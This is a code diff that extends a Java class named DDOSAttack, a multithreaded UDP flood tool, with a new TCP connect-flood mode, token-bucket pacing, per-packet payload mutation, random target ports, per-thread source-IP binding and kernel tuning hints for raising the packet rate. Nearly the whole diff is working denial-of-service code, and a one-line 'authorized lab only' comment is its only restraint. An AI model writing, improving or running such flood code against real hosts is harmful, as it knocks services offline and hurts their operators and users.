@@ -6,6 +6,18 @@ import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.LongAdder;
 
+/**
+ * High-performance UDP/TCP flood tool (Java)
+ * For authorized isolated lab environments only.
+ *
+ * Java's hard limits (cannot be fixed in pure Java):
+ *   - No raw socket / no true source-IP spoofing.
+ *   - TCP mode uses full 3-way handshake (not SYN flood).
+ *
+ * Tuning hint for Linux targets:
+ *   sysctl -w net.core.wmem_max=8388608 net.core.rmem_max=8388608
+ *   ulimit -n 65535
+ */
 public class DDOSAttack {
 
     // ---------- Shared statistics ----------
@@ -14,39 +26,106 @@ public class DDOSAttack {
     private static final LongAdder totalDropped = new LongAdder();
     private static volatile boolean stopFlag = false;
 
-    // ---------- Per-error-class counters ----------
+    // ---------- Error counters ----------
     private static final LongAdder errBind = new LongAdder();
     private static final LongAdder errPortUnreachable = new LongAdder();
     private static final LongAdder errIOException = new LongAdder();
     private static final LongAdder errOther = new LongAdder();
 
-    // ---------- Recent error details (bounded) ----------
+    // ---------- Error log rate limiter ----------
+    private static final int ERR_LOG_PER_SEC = 5;
     private static final int ERR_HISTORY_MAX = 10;
     private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();
+    private static final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(ERR_LOG_PER_SEC);
 
-    // ---------- Configuration ----------
+    // ---------- Config ----------
     private static String targetIP;
     private static int targetPort;
     private static long totalPackets;
     private static int packetSize = 1490;
     private static int numThreads = 4;
     private static int burstSize = 50;
-    private static double rateLimit = 0.0;
+    private static double rateLimit = 0.0;  // seconds per burst
     private static int duration = 0;
     private static int srcPortBase = -1;
     private static boolean randomTargetPort = false;
     private static boolean bindLocal = false;
     private static boolean varyPayload = true;
+    private static boolean useTcp = false;
     private static String logFile = null;
     private static int maxRetries = 3;
 
     private static PrintWriter logWriter = null;
-
-    // ---------- Pre-allocated target addresses ----------
     private static InetSocketAddress[] portAddresses;
-
-    // ---------- Local interface addresses (for --bind-local) ----------
     private static List<InetAddress> localAddresses = new ArrayList<>();
+
+    // ===================================================================
+    // Inner helpers
+    // ===================================================================
+
+    /** Token bucket for precise long-term rate control with short bursts. */
+    static class TokenBucket {
+        private final double capacity;
+        private final double refillPerSec;
+        private double tokens;
+        private long lastRefillNs;
+
+        TokenBucket(double capacity, double refillPerSec) {
+            this.capacity = capacity;
+            this.refillPerSec = refillPerSec;
+            this.tokens = capacity;
+            this.lastRefillNs = System.nanoTime();
+        }
+
+        private void refill() {
+            long now = System.nanoTime();
+            double elapsed = (now - lastRefillNs) / 1e9;
+            if (elapsed > 0) {
+                tokens = Math.min(capacity, tokens + elapsed * refillPerSec);
+                lastRefillNs = now;
+            }
+        }
+
+        /** Returns 0 if enough tokens; otherwise nanoseconds to wait. */
+        synchronized long nanosToWait(int need) {
+            refill();
+            if (tokens >= need) {
+                tokens -= need;
+                return 0;
+            }
+            double missing = need - tokens;
+            return (long) ((missing / refillPerSec) * 1e9);
+        }
+    }
+
+    /** Token-bucket backed error rate limiter to avoid log flood. */
+    static class ErrorRateLimiter {
+        private final int maxPerSec;
+        private long windowStart;
+        private int count;
+        private long suppressed;
+
+        ErrorRateLimiter(int maxPerSec) {
+            this.maxPerSec = maxPerSec;
+            this.windowStart = System.currentTimeMillis();
+        }
+
+        synchronized boolean allow() {
+            long now = System.currentTimeMillis();
+            if (now - windowStart > 1000) {
+                windowStart = now;
+                count = 0;
+            }
+            if (count < maxPerSec) {
+                count++;
+                return true;
+            }
+            suppressed++;
+            return false;
+        }
+
+        synchronized long suppressed() { return suppressed; }
+    }
 
     // ===================================================================
     // Main
@@ -66,7 +145,6 @@ public class DDOSAttack {
             }
         }
 
-        // Validate target
         try {
             InetAddress.getByName(targetIP);
         } catch (UnknownHostException e) {
@@ -84,15 +162,13 @@ public class DDOSAttack {
             System.exit(1);
         }
 
-        // Pre-allocate target addresses for --random-port
-        if (randomTargetPort) {
+        if (randomTargetPort && !useTcp) {
             portAddresses = new InetSocketAddress[65536];
             for (int i = 1; i <= 65535; i++) {
                 portAddresses[i] = new InetSocketAddress(targetIP, i);
             }
         }
 
-        // Enumerate local addresses for --bind-local
         if (bindLocal) {
             enumerateLocalAddresses();
             if (localAddresses.isEmpty()) {
@@ -104,25 +180,33 @@ public class DDOSAttack {
             }
         }
 
-        // Summary
-        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
-                targetIP, targetPort,
+        printKernelTuningHints();
+
+        System.out.printf("[+] target=%s:%d  proto=%s  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
+                targetIP, targetPort, useTcp ? "TCP" : "UDP",
                 (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                 totalPackets, numThreads, packetSize,
                 randomTargetPort ? "  random-port" : "",
                 varyPayload ? "  vary" : "");
         if (bindLocal) {
-            System.out.println("[+] binding per-thread local source IP (Java cannot spoof source IP)");
+            System.out.println("[+] per-thread local source IP bind (Java cannot spoof source IP)");
+        }
+        if (rateLimit > 0) {
+            System.out.printf("[+] token-bucket rate: target ≈ %.0f pps%n",
+                    burstSize / rateLimit);
         }
         System.out.println("[+] attacking... (Ctrl+C to stop)");
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));
 
         long startTime = System.currentTimeMillis();
-        startAttack();
+        if (useTcp) {
+            startTcpAttack();
+        } else {
+            startUdpAttack();
+        }
         long elapsed = System.currentTimeMillis() - startTime;
 
-        // Final statistics
         long finalSent = totalSent.longValue();
         long finalBytes = totalBytes.longValue();
         long finalDropped = totalDropped.longValue();
@@ -131,11 +215,10 @@ public class DDOSAttack {
         System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
                 finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                 elapsed / 1000.0, rate);
-
-        // Error breakdown
-        System.out.printf("[=] errors: bind=%d  port-unreach=%d  io=%d  other=%d%n",
+        System.out.printf("[=] errors: bind=%d  port-unreach=%d  io=%d  other=%d  (suppressed=%d)%n",
                 errBind.longValue(), errPortUnreachable.longValue(),
-                errIOException.longValue(), errOther.longValue());
+                errIOException.longValue(), errOther.longValue(),
+                errorLimiter.suppressed());
         if (!recentErrors.isEmpty()) {
             System.out.println("[=] recent errors:");
             for (String e : recentErrors) {
@@ -146,10 +229,20 @@ public class DDOSAttack {
         if (logWriter != null) {
             logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                     finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
-            logWriter.printf("errors: bind=%d port-unreach=%d io=%d other=%d%n",
-                    errBind.longValue(), errPortUnreachable.longValue(),
-                    errIOException.longValue(), errOther.longValue());
             logWriter.close();
+        }
+    }
+
+    // ===================================================================
+    // Kernel tuning hints
+    // ===================================================================
+    private static void printKernelTuningHints() {
+        String os = System.getProperty("os.name").toLowerCase();
+        if (os.contains("linux")) {
+            System.out.println("[+] Linux kernel tuning tips (run on your machine, needs root):");
+            System.out.println("    sysctl -w net.core.wmem_max=8388608 net.core.rmem_max=8388608");
+            System.out.println("    sysctl -w net.ipv4.udp_mem='65536 131072 262144'");
+            System.out.println("    ulimit -n 65535");
         }
     }
 
@@ -161,27 +254,31 @@ public class DDOSAttack {
         System.out.println();
         System.out.println("[+] Required:");
         System.out.println("  -t, --target        Target IP");
-        System.out.println("  -p, --port          Target UDP port");
+        System.out.println("  -p, --port          Target port");
         System.out.println("  -g, --gb            Total traffic (GB)");
         System.out.println();
         System.out.println("[+] Optional:");
         System.out.println("  -P, --processes     Thread count (default 4)");
         System.out.println("  -b, --burst         Packets per burst (default 50)");
         System.out.println("  -r, --rate          Seconds per burst (default 0 = unlimited)");
+        System.out.println("                      Note: rate is now enforced by a token bucket,");
+        System.out.println("                      so the long-term rate is precise (burstSize/rate pps).");
         System.out.println("  -d, --duration      Duration in seconds (default 0 = until finished)");
         System.out.println("  -s, --src-port      Source port base (default -1 = random)");
         System.out.println("  --size              Base packet size (default 1490)");
-        System.out.println("  --random-port       Randomize target port");
+        System.out.println("  --random-port       Randomize target port (UDP only)");
         System.out.println("  --bind-local        Bind each thread to a different local interface IP");
         System.out.println("                      (Java has no raw socket; true source-IP spoofing is impossible)");
+        System.out.println("  --tcp               Use full TCP connect (not SYN flood; Java limitation)");
         System.out.println("  --vary / --no-vary  Enable/disable payload variation (default: enabled)");
         System.out.println("  --log <file>        Log file path");
         System.out.println("  --max-retries       Max send retries per packet (default 3)");
         System.out.println("  -h, --help          Show this help");
         System.out.println();
         System.out.println("[+] Notes:");
-        System.out.println("  * True source-IP spoofing requires raw sockets (C/Python+root), not available in pure Java.");
-        System.out.println("  * --bind-local rotates through your machine's own interface IPs; effect is limited to multi-homed hosts.");
+        System.out.println("  * True source-IP spoofing requires raw sockets (C/Python+root), not available in Java.");
+        System.out.println("  * TCP mode uses full handshake; it's connect-flood, not SYN-flood.");
+        System.out.println("  * High PPS requires kernel tuning — see hints printed at startup.");
     }
 
     // ===================================================================
@@ -206,23 +303,14 @@ public class DDOSAttack {
         }
 
         targetIP = params.getOrDefault("-t", params.get("--target"));
-        if (targetIP == null) {
-            System.err.println("[!] Missing -t/--target");
-            System.exit(1);
-        }
+        if (targetIP == null) { System.err.println("[!] Missing -t/--target"); System.exit(1); }
 
         String portStr = params.getOrDefault("-p", params.get("--port"));
-        if (portStr == null) {
-            System.err.println("[!] Missing -p/--port");
-            System.exit(1);
-        }
+        if (portStr == null) { System.err.println("[!] Missing -p/--port"); System.exit(1); }
         targetPort = Integer.parseInt(portStr);
 
         String gbStr = params.getOrDefault("-g", params.get("--gb"));
-        if (gbStr == null) {
-            System.err.println("[!] Missing -g/--gb");
-            System.exit(1);
-        }
+        if (gbStr == null) { System.err.println("[!] Missing -g/--gb"); System.exit(1); }
         double gb = Double.parseDouble(gbStr);
 
         if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
@@ -234,24 +322,19 @@ public class DDOSAttack {
         if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
         if (params.containsKey("--random-port")) randomTargetPort = true;
         if (params.containsKey("--bind-local")) bindLocal = true;
+        if (params.containsKey("--tcp")) useTcp = true;
         if (params.containsKey("--no-vary")) varyPayload = false;
         if (params.containsKey("--vary")) varyPayload = true;
         if (params.containsKey("--log")) logFile = params.get("--log");
         if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));
 
-        if (gb <= 0) {
-            System.err.println("[!] GB must be > 0");
-            System.exit(1);
-        }
+        if (gb <= 0) { System.err.println("[!] GB must be > 0"); System.exit(1); }
         totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
-        if (totalPackets <= 0) {
-            System.err.println("[!] Traffic too small");
-            System.exit(1);
-        }
+        if (totalPackets <= 0) { System.err.println("[!] Traffic too small"); System.exit(1); }
     }
 
     // ===================================================================
-    // Local address enumeration (for --bind-local)
+    // Local address enumeration
     // ===================================================================
     private static void enumerateLocalAddresses() {
         try {
@@ -272,65 +355,10 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // Variant payload generator
+    // Error recording (rate-limited)
     // ===================================================================
-    /**
-     * Generates a batch of variant payloads:
-     *   - lengths vary in [baseSize - delta, baseSize + delta]
-     *   - content is random
-     *   - first 8 bytes will be overwritten per-packet with the packet counter
-     */
-    private static List<byte[]> buildVariantPool(int baseSize, int poolSize) {
-        if (!varyPayload) {
-            byte[] one = new byte[baseSize];
-            new Random().nextBytes(one);
-            List<byte[]> single = new ArrayList<>(1);
-            single.add(one);
-            return single;
-        }
-        Random rnd = new Random();
-        int delta = Math.max(1, baseSize / 10); // ±10% length variation
-        List<byte[]> pool = new ArrayList<>(poolSize);
-        for (int i = 0; i < poolSize; i++) {
-            int len = baseSize - delta + rnd.nextInt(delta * 2 + 1);
-            if (len < 64) len = 64;
-            if (len > 65000) len = 65000;
-            byte[] p = new byte[len];
-            rnd.nextBytes(p);
-            pool.add(p);
-        }
-        return pool;
-    }
-
-    // ===================================================================
-    // Send with retry (errors classified)
-    // ===================================================================
-    private static boolean sendWithRetry(DatagramChannel channel, byte[] payload,
-                                         SocketAddress target, int maxRetries,
-                                         String threadTag) {
-        ByteBuffer buffer = ByteBuffer.wrap(payload);
-        int attempts = 0;
-        while (attempts < maxRetries) {
-            try {
-                buffer.clear();
-                int written = channel.send(buffer, target);
-                if (written > 0) return true;
-            } catch (PortUnreachableException e) {
-                errPortUnreachable.increment();
-                recordError(threadTag + ": port unreachable (" + target + ")");
-            } catch (IOException e) {
-                errIOException.increment();
-                recordError(threadTag + ": IOException (" + e.getMessage() + ")");
-            } catch (Exception e) {
-                errOther.increment();
-                recordError(threadTag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
-            }
-            attempts++;
-        }
-        return false;
-    }
-
     private static void recordError(String msg) {
+        if (!errorLimiter.allow()) return;
         recentErrors.addLast(msg);
         while (recentErrors.size() > ERR_HISTORY_MAX) {
             recentErrors.pollFirst();
@@ -338,15 +366,45 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // Attack body
+    // Payload pool (DirectByteBuffer)
     // ===================================================================
-    private static void startAttack() throws Exception {
+    /**
+     * Builds a pool of pre-filled DirectByteBuffers.
+     * Variation:
+     *   - each buffer has random length ±10% around base size
+     *   - each buffer has random content
+     *   - the last 8 bytes are overwritten per-packet with a counter
+     *   - 16 random bytes near the beginning are XOR-flipped per packet
+     */
+    private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
+        Random rnd = new Random();
+        int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
+        List<ByteBuffer> pool = new ArrayList<>(poolSize);
+        for (int i = 0; i < poolSize; i++) {
+            int len = baseSize - delta + (delta > 0 ? rnd.nextInt(delta * 2 + 1) : 0);
+            if (len < 64) len = 64;
+            if (len > 65000) len = 65000;
+
+            ByteBuffer buf = ByteBuffer.allocateDirect(len);
+            byte[] tmp = new byte[len];
+            rnd.nextBytes(tmp);
+            buf.put(tmp);
+            buf.flip();
+            pool.add(buf);
+        }
+        return pool;
+    }
+
+    // ===================================================================
+    // UDP attack (main path)
+    // ===================================================================
+    private static void startUdpAttack() throws Exception {
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
         List<Future<?>> futures = new ArrayList<>();
         long packetsPerThread = totalPackets / numThreads;
         long extra = totalPackets % numThreads;
 
-        final int variantPoolSize = 256;
+        final int poolSize = 512;
 
         for (int i = 0; i < numThreads; i++) {
             long pktCount = packetsPerThread + (i < extra ? 1 : 0);
@@ -354,44 +412,59 @@ public class DDOSAttack {
             Runnable task = () -> {
                 String tag = "T" + threadId;
                 ThreadLocalRandom rnd = ThreadLocalRandom.current();
-                List<byte[]> variantPool = buildVariantPool(packetSize, variantPoolSize);
+                List<ByteBuffer> pool = buildDirectPayloadPool(packetSize, poolSize);
 
                 DatagramChannel channel = null;
-                try {
-                    channel = openChannelForThread(threadId);
+                TokenBucket bucket = null;
+                if (rateLimit > 0) {
+                    // Allow short bursts of up to 2x burstSize
+                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
+                }
 
-                    // Determine per-thread target port if random mode is not used
-                    // (in non-random mode all threads hit the same port)
+                int consecutiveFailures = 0;
+
+                try {
+                    channel = openUdpChannelForThread(threadId);
                     InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);
 
                     long sent = 0, bytesSent = 0, dropped = 0;
                     long packetCounter = 0;
 
-                    // Rate control via monotonic accumulation
-                    final long burstPeriodNs = rateLimit > 0
-                            ? (long) (rateLimit * 1_000_000_000L) : 0L;
-                    long nextTick = System.nanoTime();
-
                     while (!stopFlag && sent < pktCount) {
-
                         int toSend = (int) Math.min(burstSize, pktCount - sent);
+
+                        // --- Token bucket gate ---
+                        if (bucket != null) {
+                            long waitNs = bucket.nanosToWait(toSend);
+                            if (waitNs > 0) {
+                                TimeUnit.NANOSECONDS.sleep(waitNs);
+                            }
+                        }
 
                         for (int j = 0; j < toSend; j++) {
                             if (stopFlag || sent >= pktCount) break;
 
-                            // --- Variant payload selection ---
-                            byte[] payload = variantPool.get(
-                                    (int) (packetCounter % variantPool.size()));
-                            // Overwrite first 8 bytes with packet counter so
-                            // every packet is unique even if pool content repeats
-                            long tagBytes = packetCounter;
-                            for (int b = 0; b < 8 && b < payload.length; b++) {
-                                payload[payload.length - 1 - b] = (byte) (tagBytes & 0xFF);
-                                tagBytes >>>= 8;
+                            ByteBuffer buf = pool.get((int) (packetCounter % pool.size()));
+                            int limit = buf.limit();
+                            if (limit < 8) continue;
+
+                            // Overwrite last 8 bytes with counter
+                            long c = packetCounter;
+                            for (int b = 0; b < 8; b++) {
+                                buf.put(limit - 1 - b, (byte) (c & 0xFF));
+                                c >>>= 8;
+                            }
+                            // XOR-flip 16 bytes near the beginning (index 4..19) for variation
+                            if (varyPayload && limit >= 24) {
+                                int base = 4;
+                                for (int b = 0; b < 16; b++) {
+                                    int idx = base + b;
+                                    byte v = buf.get(idx);
+                                    buf.put(idx, (byte) (v ^ (byte) rnd.nextInt(256)));
+                                }
                             }
                             packetCounter++;
 
-                            // --- Target address ---
                             InetSocketAddress targetAddr;
                             if (randomTargetPort) {
                                 int port = rnd.nextInt(1, 65536);
@@ -400,22 +473,25 @@ public class DDOSAttack {
                                 targetAddr = dest;
                             }
 
-                            // --- Send ---
-                            if (sendWithRetry(channel, payload, targetAddr, maxRetries, tag)) {
+                            boolean ok = sendUdpWithRetry(channel, buf, targetAddr, tag);
+                            if (ok) {
                                 sent++;
-                                bytesSent += payload.length;
+                                bytesSent += limit;
+                                consecutiveFailures = 0;
                             } else {
                                 dropped++;
-                                // Rebuild channel if it seems broken
-                                try {
-                                    if (channel != null && !channel.isOpen()) {
-                                        channel = openChannelForThread(threadId);
+                                consecutiveFailures++;
+                                // Exponential backoff on repeated failures
+                                if (consecutiveFailures >= 3) {
+                                    long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
+                                    Thread.sleep(backoffMs);
+                                    if (channel == null || !channel.isOpen()) {
+                                        try { channel = openUdpChannelForThread(threadId); } catch (Exception ignore) {}
                                     }
-                                } catch (Exception ignore) { }
+                                }
                             }
                         }
 
-                        // --- Incremental global update ---
                         if (sent > 0) {
                             totalSent.add(sent);
                             totalBytes.add(bytesSent);
@@ -423,21 +499,6 @@ public class DDOSAttack {
                             sent = 0;
                             bytesSent = 0;
                             dropped = 0;
-                        }
-
-                        // --- Rate control with drift compensation ---
-                        if (burstPeriodNs > 0) {
-                            nextTick += burstPeriodNs;
-                            long now = System.nanoTime();
-                            long sleepNs = nextTick - now;
-                            if (sleepNs > 0) {
-                                try {
-                                    TimeUnit.NANOSECONDS.sleep(sleepNs);
-                                } catch (InterruptedException ignored) { }
-                            } else {
-                                // Behind schedule — reset tick to "now" to avoid burst catch-up storm
-                                nextTick = now;
-                            }
                         }
                     }
 
@@ -454,7 +515,103 @@ public class DDOSAttack {
             futures.add(executor.submit(task));
         }
 
-        // ---------- Progress monitor ----------
+        waitWithProgress(executor, futures);
+    }
+
+    // ===================================================================
+    // TCP attack (connect flood; not SYN flood)
+    // ===================================================================
+    private static void startTcpAttack() throws Exception {
+        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
+        List<Future<?>> futures = new ArrayList<>();
+        long packetsPerThread = totalPackets / numThreads;
+        long extra = totalPackets % numThreads;
+
+        final int connectTimeoutMs = 1000;
+        final int socketTimeoutMs = 500;
+
+        for (int i = 0; i < numThreads; i++) {
+            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
+            int threadId = i;
+            Runnable task = () -> {
+                String tag = "T" + threadId;
+                InetAddress bindAddr = null;
+                if (bindLocal && !localAddresses.isEmpty()) {
+                    bindAddr = localAddresses.get(threadId % localAddresses.size());
+                }
+
+                long sent = 0, bytesSent = 0, dropped = 0;
+                int consecutiveFailures = 0;
+                byte[] payload = new byte[Math.min(64, packetSize)];
+                new Random().nextBytes(payload);
+
+                TokenBucket bucket = null;
+                if (rateLimit > 0) {
+                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
+                }
+
+                while (!stopFlag && sent < pktCount) {
+                    int toSend = (int) Math.min(burstSize, pktCount - sent);
+
+                    if (bucket != null) {
+                        long waitNs = bucket.nanosToWait(toSend);
+                        if (waitNs > 0) {
+                            try { TimeUnit.NANOSECONDS.sleep(waitNs); } catch (InterruptedException ignored) {}
+                        }
+                    }
+
+                    for (int j = 0; j < toSend; j++) {
+                        if (stopFlag || sent >= pktCount) break;
+
+                        try (Socket s = new Socket()) {
+                            if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
+                            s.setSoTimeout(socketTimeoutMs);
+                            s.connect(new InetSocketAddress(targetIP, targetPort), connectTimeoutMs);
+                            OutputStream os = s.getOutputStream();
+                            os.write(payload);
+                            os.flush();
+                            sent++;
+                            bytesSent += payload.length;
+                            consecutiveFailures = 0;
+                        } catch (PortUnreachableException e) {
+                            errPortUnreachable.increment();
+                            dropped++;
+                            consecutiveFailures++;
+                        } catch (IOException e) {
+                            errIOException.increment();
+                            dropped++;
+                            consecutiveFailures++;
+                        }
+
+                        if (consecutiveFailures >= 3) {
+                            long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
+                            try { Thread.sleep(backoffMs); } catch (InterruptedException ignored) {}
+                            if (consecutiveFailures > 6) {
+                                recordError(tag + ": too many consecutive failures, backoff " + backoffMs + "ms");
+                            }
+                        }
+                    }
+
+                    if (sent > 0 || dropped > 0) {
+                        totalSent.add(sent);
+                        totalBytes.add(bytesSent);
+                        totalDropped.add(dropped);
+                        sent = 0;
+                        bytesSent = 0;
+                        dropped = 0;
+                    }
+                }
+            };
+            futures.add(executor.submit(task));
+        }
+
+        waitWithProgress(executor, futures);
+    }
+
+    // ===================================================================
+    // Progress monitor + graceful shutdown
+    // ===================================================================
+    private static void waitWithProgress(ExecutorService executor, List<Future<?>> futures) throws Exception {
         long start = System.currentTimeMillis();
         long lastReportTime = start;
         long lastReportSent = 0;
@@ -467,7 +624,6 @@ public class DDOSAttack {
             long dropped = totalDropped.longValue();
 
             if (sent >= totalPackets) break;
-
             if (duration > 0 && elapsed / 1000 >= duration) {
                 stopFlag = true;
                 break;
@@ -479,8 +635,8 @@ public class DDOSAttack {
                 double instantRate = deltaSent / deltaTime;
                 double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                 double dataGB = bytes / (1024.0 * 1024 * 1024);
-                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
-                        sent, dataGB, rate, instantRate, dropped);
+                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err_suppressed=%d%n",
+                        sent, dataGB, rate, instantRate, dropped, errorLimiter.suppressed());
                 if (logWriter != null) {
                     logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                             sent, dataGB, rate, dropped);
@@ -509,18 +665,45 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // Open a DatagramChannel for a given thread
-    //   - Optionally binds to a distinct local interface address (--bind-local)
-    //   - Optionally binds to srcPortBase + threadId (for source-port pinning)
-    //   - SO_REUSEADDR enabled to reduce bind conflicts
+    // UDP send with retry
     // ===================================================================
-    private static DatagramChannel openChannelForThread(int threadId) throws IOException {
+    private static boolean sendUdpWithRetry(DatagramChannel channel, ByteBuffer buf,
+                                            SocketAddress target, String tag) {
+        int attempts = 0;
+        while (attempts < maxRetries) {
+            try {
+                buf.clear();
+                int written = channel.send(buf, target);
+                if (written > 0) return true;
+            } catch (PortUnreachableException e) {
+                errPortUnreachable.increment();
+                recordError(tag + ": port unreachable (" + target + ")");
+            } catch (IOException e) {
+                errIOException.increment();
+                recordError(tag + ": IOException (" + e.getMessage() + ")");
+            } catch (Exception e) {
+                errOther.increment();
+                recordError(tag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
+            }
+            attempts++;
+        }
+        return false;
+    }
+
+    // ===================================================================
+    // UDP channel factory (larger SO_SNDBUF; per-thread local IP bind)
+    // ===================================================================
+    private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
         DatagramChannel channel = DatagramChannel.open();
         channel.configureBlocking(true);
 
         DatagramSocket socket = channel.socket();
         try {
             socket.setReuseAddress(true);
+            // Try to enlarge send buffer to 4MB; ignore if unsupported
+            try {
+                socket.setSendBufferSize(4 * 1024 * 1024);
+            } catch (SocketException ignored) { }
         } catch (SocketException ignored) { }
 
         InetAddress bindAddr = null;
@@ -543,7 +726,6 @@ public class DDOSAttack {
                 recordError("T" + threadId + ": bind failed ("
                         + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
                         + "), using system-assigned");
-                // fall through — system will pick a random port
             }
         }
 
